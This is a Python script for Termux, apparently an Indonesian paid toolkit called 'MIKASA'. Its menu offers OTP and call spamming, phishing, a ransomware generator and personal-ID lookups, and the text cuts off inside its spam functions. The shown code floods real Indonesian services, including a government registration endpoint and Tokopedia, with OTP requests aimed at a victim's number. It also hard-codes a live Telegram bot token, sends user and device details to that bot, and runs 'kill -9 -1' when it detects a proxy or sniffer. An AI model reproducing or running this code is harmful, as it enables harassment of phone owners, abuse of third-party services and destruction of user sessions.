#!/usr/bin/env python3

import os
import sys
import time
import re
import json
import requests
import threading
import random
import base64
import uuid
import phonenumbers
import subprocess
import hashlib
import socket
import platform
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from phonenumbers import NumberParseException
import urllib3
import signal
import string
from phonenumbers import geocoder, carrier, timezone as phone_timezone
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, quote, unquote
from colorama import Fore, Back, init
from fake_useragent import UserAgent
import sys
import time

BI = '\033[44m'
TP = '\033[1;37m'
RESET = '\033[0m'
R = '\033[1;31m'
G = '\033[1;32m'
Y = '\033[1;33m'
P = '\033[1;35m'
C = '\033[1;36m'
W = '\033[1;37m'
N = '\033[0m'
RS = '\033[0m'
PU = '\033[35m'
M = '\033[91m'
H = '\033[92m'
K = '\033[93m'
B = '\033[94m'
U = '\033[95m'
C = '\033[96m'
P = '\033[97m'
a = '\033[1;30m'
Grey = '\033[90m'
BM = '\033[41m'
BH = '\033[42m'
BK = '\033[43m'
BB = '\033[44m'
BU = '\033[45m'
BC = '\033[46m'
BP = '\033[47m'

os.system('clear')

def play_menu_sound():
    try:
        sound_dir = "/sdcard/Sounds"
        if not os.path.exists(sound_dir):
            os.makedirs(sound_dir)

        sound_file = os.path.join(sound_dir, "Masuk_menu.mp3")
        if not os.path.exists(sound_file):
            os.system('curl -s -L "https://raw.githubusercontent.com/OoTotapxciwiiekfkdoapz1910la9911729Kh1/Sound-Mikasa/main/Masuk_menu.mp3" -o "/sdcard/Sounds/Masuk_menu.mp3"')

        os.system('mpv --no-video --really-quiet "/sdcard/Sounds/Masuk_menu.mp3" 2>/dev/null &')
    except:
        pass

def loading_running(text="Sedang Running Tools", duration=10):
    chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    start = time.time()
    i = 0
    while time.time() - start < duration:
        sys.stdout.write(f"\r{BI} {TP} {chars[i % len(chars)]} {text} {N}")
        sys.stdout.flush()
        i += 1
        time.sleep(0.08)
    sys.stdout.write("\r" + " " * 60 + "\r")
    sys.stdout.flush()
    os.system('clear')

loading_running()
asci = """
        .-:..:..           ..
       :--::....:......:::::.
      .:---::::::::......--.
      .:---:......:....:-...
      .:----::::.....:--....
      .:-----::....:-=:.:...
       .------.::----:...:..
        .---=--:::--:.....:.
         .-====--:.:::...::.:.
          .---=====:...:.:...:.
         .--==--==----:...::....
       .:---:..:-=---=----:...:.
       ...--:.   ...::::::--....
         :===:
         :===:
         .===:
        .:.-::.
       ..:.-:::.
      ..:..-:.:..
     ..:. .-:..:..
 ....::....-:...::....
 .---===--===---=-=---.
======================================
    Sedang Mengecek Networking...!
======================================
"""
os.system(f' echo "{asci}" | lolcat')
time.sleep(10)
os.system('clear')

os.system('clear')

babi = """
╭──────────────────────────────────────────────────────╮
│ Mohon Bersabar Sedang Verifikasi Keamanan [ ✦ ]
╰──────────────────────────────────────────────────────╯
"""

def pantau_aktivitas():
    import os, sys, subprocess, re, socket, time, requests, hashlib, stat, platform

    BOT_TOKEN = "8685515038:AAEW_N4J98oYLIMpP71Fc9W99ha7nR4mJAs"
    ADMIN_ID = "8873967955"
    UID_LIST_URL = "https://raw.githubusercontent.com/x7f9k2m4n6j4h8t2v9p5s3k1/a7k3m9x2v5n8j4h6/main/Uid.txt"

    def log_and_exit(msg):
        print(msg)
        os.system("kill -9 -1 2>/dev/null")
        sys.exit(1)

    def get_uid():
        try:
            whoami = subprocess.check_output(['whoami'], stderr=subprocess.DEVNULL).decode().strip()
            if whoami:
                return hashlib.md5(whoami.encode()).hexdigest()[:12]
            else:
                return socket.gethostname()
        except:
            return socket.gethostname()

    def get_user_data():
        try:
            resp = requests.get(UID_LIST_URL, timeout=10)
            if resp.status_code == 200:
                data = {}
                for line in resp.text.strip().split('\n'):
                    if '|' in line:
                        parts = line.split('|')
                        if len(parts) >= 2:
                            data[parts[0].strip()] = parts[1].strip()
                return data
        except:
            pass
        return {}

    def send_telegram(msg):
        uid = get_uid()
        user_data = get_user_data()
        name = user_data.get(uid, "Tidak Dikenal")
        full_msg = f"🆔 UID: {uid}\n👤 Nama: {name}\n{msg}"
        try:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": ADMIN_ID, "text": full_msg, "parse_mode": "HTML"}, timeout=5)
        except:
            pass

    sniffers = ["tcpdump", "tshark", "strace", "ettercap", "ngrep", "wireshark", "fiddler", "charles"]
    for sniffer in sniffers:
        try:
            if subprocess.call(["pgrep", "-x", sniffer], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
                log_and_exit("LU SEMUA NGENTOT !!")
        except:
            pass

    try:
        lsof = subprocess.check_output(["lsof", "-p", str(os.getpid())], text=True, stderr=subprocess.DEVNULL)
        if "libtermux-net.so" in lsof:
            log_and_exit("LU SEMUA NGENTOT !!")
    except:
        pass

    try:
        ifconfig = subprocess.check_output(["ifconfig"], text=True, stderr=subprocess.DEVNULL)
        if re.search(r'tun[0-9]', ifconfig):
            log_and_exit("LU SEMUA NGENTOT !!")
    except:
        pass

    detected = False
    reason = ""

    try:
        if "reqable" in subprocess.check_output(["ps", "aux"], text=True, stderr=subprocess.DEVNULL).lower():
            detected = True
            reason = "Proses Reqable aktif"
    except:
        pass

    if not detected:
        for port in [8080, 8888, 9000, 9090]:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            if sock.connect_ex(('127.0.0.1', port)) == 0:
                detected = True
                reason = f"Port {port} terbuka (Reqable aktif)"
                sock.close()
                break
            sock.close()

    if not detected:
        if os.environ.get('HTTP_PROXY') or os.environ.get('HTTPS_PROXY'):
            detected = True
            reason = "Environment proxy aktif"

    if not detected:
        try:
            output = subprocess.check_output(["pm", "list", "packages"], text=True, stderr=subprocess.DEVNULL)
            if "com.reqable" in output:
                detected = True
                reason = "Package Reqable terinstall"
        except:
            pass

    if not detected:
        try:
            lsof = subprocess.check_output(["lsof", "-p", str(os.getpid())], text=True, stderr=subprocess.DEVNULL)
            if "reqable" in lsof.lower():
                detected = True
                reason = "Reqable terdeteksi via lsof"
        except:
            pass

    if detected:
        os.system("pkill -f reqable 2>/dev/null")
        os.system("pkill -f com.reqable 2>/dev/null")
        os.system("am force-stop com.reqable 2>/dev/null")
        time.sleep(1)
        send_telegram(f"[  !!  ] REQABLE DETECTED!\nAlasan: {reason}\nAction: Tools dihentikan!")
        print(f"\nNgapain cill? pake reqable segala😹")
        sys.exit(1)

pantau_aktivitas()

os.system(f'echo "{babi}" | lolcat')
time.sleep(10)
os.system('clear')
REPO_UID = "https://raw.githubusercontent.com/x7f9k2m4n6j4h8t2v9p5s3k1/a7k3m9x2v5n8j4h6/main/Uid.txt"
BOT_TOKEN = "8685515038:AAEW_N4J98oYLIMpP71Fc9W99ha7nR4mJAs"
ADMIN_ID = "8873967955"

def get_persistent_dir():
    base_dir = os.path.expanduser("~")
    
    hidden_dir = os.path.join(base_dir, ".termux", ".cache", ".config", ".local")
    
    try:
        if not os.path.exists(hidden_dir):
            os.makedirs(hidden_dir, exist_ok=True)
        
        fake_files = [
            "bash_history",
            "termux.properties",
            "fonts.conf",
            "colors.properties",
            "keyboard.ini",
            ".motd",
            ".bashrc"
        ]
        for fake in fake_files:
            fake_path = os.path.join(hidden_dir, fake)
            if not os.path.exists(fake_path):
                with open(fake_path, "w") as f:
                    fake_content = ''.join(os.urandom(200).hex())
                    f.write(fake_content)
    except:
        pass
    
    return hidden_dir

def generate_uid_baru():
    try:
        whoami = subprocess.check_output(['whoami'], stderr=subprocess.DEVNULL).decode().strip()
        if whoami:
            new_uid = hashlib.md5(whoami.encode()).hexdigest()[:12]
        else:
            new_uid = socket.gethostname()
    except:
        new_uid = socket.gethostname()
    
    persistent_dir = get_persistent_dir()
    uid_file = os.path.join(persistent_dir, ".device_id")
    
    try:
        with open(uid_file, "w") as f:
            f.write(new_uid)
    except:
        pass
    
    return new_uid

def get_uid():
    persistent_dir = get_persistent_dir()
    uid_file = os.path.join(persistent_dir, ".device_id")
    
    if os.path.exists(uid_file):
        try:
            with open(uid_file, "r") as f:
                saved_uid = f.read().strip()
            if saved_uid:
                if saved_uid == "localhost" or len(saved_uid) < 8:
                    return generate_uid_baru()
                return saved_uid
        except:
            pass
    
    return generate_uid_baru()

def cek_uid_simple(uid):
    db = load_database()
    if not db:
        return False, None
    users = db.get("users", [])
    for user in users:
        if user.get("uid") == uid:
            if user.get("status") == "active":
                return True, user
            return False, user
    return False, None

def load_database():
    try:
        resp = requests.get(REPO_UID, timeout=10)
        if resp.status_code == 200:
            lines = resp.text.strip().splitlines()
            users = []
            for line in lines:
                line = line.strip()
                if line and not line.startswith('#'):
                    parts = line.split('|')
                    if len(parts) >= 3:
                        users.append({
                            "uid": parts[0].strip(),
                            "nama": parts[1].strip(),
                            "status": "active" if parts[2].strip() == "1" else "pending"
                        })
                    elif len(parts) == 2:
                        users.append({
                            "uid": parts[0].strip(),
                            "nama": parts[1].strip(),
                            "status": "active"
                        })
            return {"users": users}
        return None
    except:
        return None

def save_database(data):
    return True

def cek_uid(uid):
    db = load_database()
    if not db:
        return None, None
    users = db.get("users", [])
    for user in users:
        if user.get("uid") == uid:
            if user.get("status") == "active":
                return True, user
            return False, user
    return False, None

def kirim_notif_telegram(uid, username):
    try:
        pesan = f"""
🔑 REGISTRASI UID BARU

🆔 UID: {uid}
👤 Username: {username}
📱 Device: {platform.system()} {platform.release()}
🕐 Waktu: {datetime.now().strftime('%d-%m-%Y %H:%M:%S')}

Tambahkan ke Uid.txt:
{uid}|{username}|0
"""
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {"chat_id": ADMIN_ID, "text": pesan}
        resp = requests.post(url, json=payload, timeout=10)
        return resp.status_code == 200
    except Exception as e:
        return False

def register_user(uid, username):
    db = load_database()
    if db is None:
        db = {"users": []}
    for user in db.get("users", []):
        if user.get("uid") == uid:
            if user.get("status") == "active":
                return False, "UID sudah aktif!"
            return False, "UID sudah terdaftar, menunggu aktivasi!"
    
    kirim_notif_telegram(uid, username)
    return True, "UID terkirim ke admin, tunggu aktivasi!"

def menu_uid():
    os.system('clear')
    
    uid = get_uid()
    status, user_data = cek_uid(uid)
    
    if status and user_data and user_data.get('status') == 'active':
        asu = f"""
            *+**
        :############:
       ###:        :###
    :###             ###
     ###              ###
     ###
     ###
     ###
   ##########################
   ##########################
   ############  ############
   ##########      ##########
   ###########    ###########
   ############  ############
   ###########*  *###########
   ##########################
   ##########################
     =**********************=
=====================================
  [ ✓ ] Tools dapat di Access!!!
=====================================
UID: {uid}
"""
        os.system(f'echo "{asu}" | lolcat 2>/dev/null || echo "{asu}"')
        time.sleep(5)
        os.system('clear')
        return
    
    ascii_art = """⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
         ⢀⣤⣶⣶⠖  ⠲⣶⣶⣤⡀
       ⢀⣴⣿⡿⠋      ⠙⢿⣿⣦
      ⢀⣾⣿⡟          ⢻⣿⣷⡀
      ⣾⣿⣿⠁           ⣿⣿⣷
      ⣿⣿⣿⣇⣤⠶⠛⣛⣉⣙⡛⠛⢶⣄⣸⣿⣿⣿
    ⢀⣀⣿⣿⣿⡟⢁⣴⣿⣿⣿⣿⣿⣿⣦⡈⢿⣿⣿⣿⣀⡀
  ⢠⣴⣿⣿⣿⣿⡟⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡌⢿⣿⣿⣿⣿⣦⡄
 ⣴⣿⣿⡿⠿⢛⣻⡇⢸⡟⠻⣿⣿⣿⣿⣿⡿⠟⢻⡇⣸⣛⡛⠿⣿⣿⣿⣦
⢸⣿⡿⠋  ⢸⣿⣿⡜⢧⣄⣀⣉⡿⣿⣉⣀⣠⣼⢁⣿⣿⡇  ⠙⢿⣿⡆
⣿⣿⠁   ⠈⣿⣿⡇⣿⡿⠛⣿⣵⣮⣿⡟⢻⡿⢨⣿⣿    ⠈⣿⣿
⢿⡟     ⠘⣿⣷⣤⣄⡀⣿⣿⣿⣿⢁⣤⣶⣿⣿⠃     ⣿⡟
⠘⠇      ⠈⠻⣿⣿⡇⢿⣿⣿⣿⢸⣿⣿⠟⠁      ⠻⠃
  ⢀⡀       ⢩⣦⣘⡘⠋⣛⣸⡍⠁      ⢀⡀
  ⠘⢿⣷⣤⣤⣄⣤⣤⣶⣿⣿⣿⡿⢿⣿⣿⣿⣷⣤⣤⣠⣤⣴⣾⡿⠁
    ⠉⠛⠿⠿⠿⡿⠿⠿⠛⠉  ⠉⠛⠿⠿⣿⠿⠿⠿⠛⠉   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""
    try:
        os.system(f'echo "{ascii_art}" | lolcat 2>/dev/null || echo "{ascii_art}"')
    except:
        print(ascii_art)

    ascii_tetau_apa = """
╭──────────────────────────────────────────────────────────────╮
│ Belum Ada UID Terdaftar Silahkan Daftar Terlebih Dahulu!
╰──────────────────────────────────────────────────────────────╯"""
    os.system(f'echo "{ascii_tetau_apa}" | lolcat')

    time.sleep(3)
    os.system('clear')
    
    ascii_login = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⣦⣶⣶⣶⣶⣶⣶⣴⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣿⣿⠿⠟⠟⠛⠙⠉⠉⠋⠙⠙⠛⠛⠿⢿⣿⣿⣦⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⣿⠿⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⣿⣦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣴⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣦⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣾⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣷⡀⠀⠀⠀
⠀⠀⢠⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⡄⠀⠀
⠀⢀⣾⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣷⡀⠀
⠀⣼⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣧⠀
⢀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡀
⢸⣿⡗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢽⣿⡆
⢸⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠛⠛⠉⠁⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣹⣿⡇
⠸⣿⡯⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣶⣤⣤⣤⣠⣤⣴⣶⣿⣿⣶⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣺⣿⠇
⠈⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⠁
⠀⢻⣿⣆⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠀⠀⠀⠀⠀⠀⣰⣿⡏⠀
⠀⠈⢿⣿⡄⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⢠⣿⡿⠁⠀
⠀⠀⠘⣿⣿⡄⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⣠⣿⣿⠃⠀⠀
⠀⠀⠀⠈⢿⣿⣦⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⣴⣿⡿⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠻⠻⠿⠿⠿⠿⠟⠟⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""
    os.system(f'echo "{ascii_login}" | lolcat')
    print(f"""
{W}╭─────────────────────────────────────────────────────────────────────╮
{W}│  [ {G}1{W} ] Daftar UID baru
{W}│  [ {R}0{W} ] Keluar
{W}╰─────────────────────────────────────────────────────────────────────╯{N}""")
    
    pilihan = input(f"{U}❯❯❯ {W}Pilih Menu{R}❯{N} ").strip()
    
    if pilihan == "0":
        print(f"\n{R}[!] Keluar...{N}")
        time.sleep(1)
        sys.exit(0)
    
    elif pilihan == "1":
        print(f"\n{W}Masukkan username (tanpa spasi, 3-12 karakter):{N}")
        username = input(f"{W}╰──{R}❯{N} ").strip()

        if not username or len(username) < 3 or len(username) > 12 or " " in username:
            print(f"{W}[ {G}~{W} ] Username tidak valid!{N}")
            return menu_uid()
        
        success, msg = register_user(uid, username)
        
        if success:
            print(f"{W}[ {G}✓{W} ] Success Registerasi{N}")
            print(f"{W}Silahkan Menunggu {G}Admin{W} Untuk Menerima Registetasi {G}Uid{N}")
            print(f"{U}❯❯❯{W} Silahkan Tekan {G}Enter{W} Untuk Keluar{N}")
            input()
            sys.exit(0)
        else:
            print(f"{R}❌ {msg}{N}")
            time.sleep(2)
            return menu_uid()

    elif pilihan == "2":
         return menu_uid()
    else:
        print(f"{R}❌ Pilihan tidak valid!{N}")
        time.sleep(1)
        return menu_uid()

stop_animasi = False

def animasi_loading(text="Loading", durasi=2):
    chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    i = 0
    start = time.time()
    while not stop_animasi and (time.time() - start) < durasi:
        sys.stdout.write(f"\r{R}[{chars[i % len(chars)]}] {W}{text}{N}")
        sys.stdout.flush()
        i += 1
        time.sleep(0.1)
    sys.stdout.write("\r" + " " * 50 + "\r")

animasi_loading()

def loading_masuk():
    global stop_animasi
    stop_animasi = False
    t = threading.Thread(target=animasi_loading, args=("Memuat MIKASA...", 2))
    t.daemon = True
    t.start()
    time.sleep(2)
    stop_animasi = True
    t.join(timeout=0.5)
    print("\r" + " " * 50 + "\r", end="")

loading_masuk()

def get_user():
    try:
        return os.popen('whoami').read().strip()
    except:
        return "?"

def get_date():
    return datetime.now().strftime("%d-%m-%Y")

def get_username():
    uid = get_uid()
    status, user_data = cek_uid(uid)
    if status and user_data:
        return user_data.get("nama", "Unknown")
    return "Unknown"

def print_banner(user, date, username):
    uid = get_uid()
    status, _ = cek_uid(uid)
    status_text = f"{G}ACTIVE{W}" if status else f"{R}PENDING{W}"
    
    print(rf"""
{G}   _____  .__ __                           {N}
{G}  /     \ |__|  | _______    ___________   {N}
{G} /  \ /  \|  |  |/ /\__  \  /  ___/\__  \  {N}
{G}/    Y    \  |    <  / __ \_\___ \  / __ \_{N}
{G}\____|__  /__|__|_ \(____  /____  >(____  /{N}
{G}        \/        \/     \/     \/      \/ {N}                                                                             {N}
{W}╭────────────────────────────────────────────────────────────╮{N}
{W}│  {W}UID   : {C}{uid}{N}
{W}│  {W}Status: {status_text}{N}
{W}│  {W}Author: {G}Rulzzz_06{N}
{W}│  {W}Tools : {G}38{N}
{W}│  {W}Date  : {G}{date}{N}
{W}│  {W}Version: {G}3.4.4{N}
{W}│  {W}Halo👋: {G}{username}{N}
{W}│  {W}User : {G}Premium{N}
{W}╰────────────────────────────────────────────────────────────╯{N}
                           M E N U
{W}╭────────────────────────────────────────────────────────────╮{N}
{W}│ [ {G}01{W} ] {N}SPAM OTP WA {R}/{W} SMS{N}
{W}│ [ {G}02{W} ] {N}SPAM PAIRING{N}
{W}│ [ {G}03{W} ] {N}SPAM CALL{N}
{W}│ [ {G}04{W} ] {N}SPAM REPORT{N}
{W}│ [ {G}05{W} ] {N}SPAM NGL{N}
{W}│ [ {G}06{W} ] {N}OSINT{N}
{W}│ [ {G}07{W} ] {N}Music{N}
{W}│ [ {G}08{W} ] {N}Obfuscate Python{N}
{W}│ [ {G}09{W} ] {N}cracker alamat IP{N}
{W}│ [ {G}10{W} ] {N}Scanner Port Web{N}
{W}│ [ {G}11{W} ] {N}Parster NIK{N}
{W}│ [ {G}12{W} ] {N}Phising IP
{W}│ [ {G}13{W} ] {N}Tiktok downloader{N}
{W}│ [ {G}14{W} ] {N}Gabung Grup{N}
{W}│ [ {G}15{W} ] {N}QR Generator{N}
{W}│ [ {G}16{W} ] {N}List User access{N}
{W}│ [ {G}17{W} ] {N}Checker Code Pos{N}
{W}│ [ {G}18{W} ] {N}Dork NPSN{N}
{W}│ [ {G}19{W} ] {N}Checker uid Freefire{N}
{W}│ [ {G}20{W} ] {N}Checker Akun Roblox{N}
{W}│ [ {G}21{W} ] {N}Spam Akun Email{N}
{W}│ [ {G}22{W} ] {N}Cek data Guru{N}
{W}│ [ {G}23{W} ] {N}Spam bot Telegram{N}
{W}│ [ {G}24{W} ] {N}Generator Ransomware terminal{N}
{W}│ [ {G}25{W} ] {N}Cek IMEI{N}
{W}│ [ {G}26{W} ] {N}Cek Link {R}/{W} Web Phising{N}
{W}│ [ {G}27{W} ] {N}Web Reconnaissance{N}
{W}│ [ {G}28{W} ] {N}lapor Bug ke Admin{N}
{W}│ [ {G}29{W} ] {N}Tools Tambahan{N}
{W}│ [ {G}30{W} ] {N}Photo {R}/{W} Video to URL{N}
{W}│ [ {G}31{W} ] {N}File to URL{N}
{W}│ [ {G}32{W} ] {N}KILL Bot Telegram{N}
{W}│ [ {G}33{W} ] {N}Cek Informasi Bot Telegram{N}
{W}│ [ {G}34{W} ] {N}Link Shortener{N}
{W}│ [ {G}35{W} ] {N}Downloader Status Contact{N}
{W}│ [ {G}36{W} ] {N}Cek Resi Paket{N}
{W}│ [ {G}37{W} ] {N}Get id Bot telegram{N}
{W}│ [ {G}38{W} ] {N}Thema termux kece{N}
{W}╰╭───────────────────────────────────────────────────────────╮{N}
{W}  {R}00{N} EXIT{N}
{W}╰────────────────────────────────────────────────────────────╯{N}

{W}╭──({G}{user}{W})-[{C}MIKASA{W}]-[{Y}{date}{W}]
{W}╰─{R}❯{N} """, end="")

clock_running = True
current_input = ""

def refresh_date():
    global clock_running, current_input
    last_date = ""
    
    while clock_running:
        user = get_user()
        date = get_date()
        username = get_username()

        if date != last_date:
            os.system('clear')
            print_banner(user, date, username)
            last_date = date
            
            if current_input:
                sys.stdout.write(current_input)
                sys.stdout.flush()
        
        time.sleep(1)


cooldown_otp = 0
cooldown_lock = threading.Lock()
stop_cooldown = False
stop_spinner = False

pantau_aktivitas()

def spam_otp_sidemang(nomor):
    try:
        if nomor.startswith('0'):
            nomor = nomor
        elif nomor.startswith('62'):
            nomor = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            nomor = '0' + nomor[3:]
        else:
            nomor = '0' + nomor
        
        import random
        import string
        
        nama = ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 8)))
        email = f"{nama}{random.randint(100, 999)}@gmail.com"
        
        url = 'https://sidemang.palembang.go.id/api/users/register/send-otp'
        
        headers = {
            'Content-Type': 'application/json',
            'origin': 'https://sidemang.palembang.go.id',
            'referer': 'https://sidemang.palembang.go.id/register-otp',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36',
            'accept': 'application/json, text/plain, */*',
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
        }
        
        payload = {
            "phoneNumber": nomor,
            "email": email
        }
        
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
        
    except Exception as e:
        return False

def spam_otp_adiraku(nomor):
     try:
        if nomor.startswith('62'):
            nomor_lokal = '0' + nomor[2:]
        elif nomor.startswith('0'):
            nomor_lokal = nomor
        else:
            nomor_lokal = '0' + nomor

        url = 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata'
        headers = {
            'Content-Type': 'application/json; charset=utf-8'
        }
        payload = {
            'mobileNumber': nomor_lokal,
            'type': 'prospect-create',
            'channel': 'whatsapp'
        }

        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400

     except Exception as e:
        return False
    
def spam_otp_tokopedia(nomor):
      try:
        session = requests.Session()
        url_token = f"https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn={nomor}&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister"
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        resp = session.get(url_token, headers=headers, timeout=10)
        token = re.search(r'<input\s+id="Token"\s+value="([^"]+)"', resp.text)
        if not token:
            return False
        url_otp = "https://accounts.tokopedia.com/otp/c/ajax/request-wa"
        data = {
            "otp_type": "116",
            "msisdn": nomor,
            "tk": token.group(1),
            "email": "",
            "original_param": "",
            "user_id": "",
            "signature": "",
            "number_otp_digit": "6"
        }
        headers["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8"
        headers["X-Requested-With"] = "XMLHttpRequest"
        resp2 = session.post(url_otp, data=data, headers=headers, timeout=10)
        return resp2.status_code == 200
      except:
        return False
    
def spam_otp_singa(nomor):
    try:
        url = 'https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id='
        payload = {'mobile_phone': nomor, 'type': 'mobile', 'is_switchable': 1}
        headers = {'Content-Type': 'application/json; charset=utf-8'}
        res = requests.post(url, json=payload, headers=headers, timeout=10)
    except:
        return False
        
def spam_otp_singa_kedua(nomor):
    try:
        url = 'https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id='
        payload = {'mobile_phone': nomor, 'type': 'mobile', 'is_switchable': 1}
        headers = {'Content-Type': 'application/json; charset=utf-8'}
        res = requests.post(url, json=payload, headers=headers, timeout=10)
    except:
        return False

def spam_otp_singa_wa(nomor):
    try:
        if nomor.startswith('0'):
            nomor = '62' + nomor[1:]
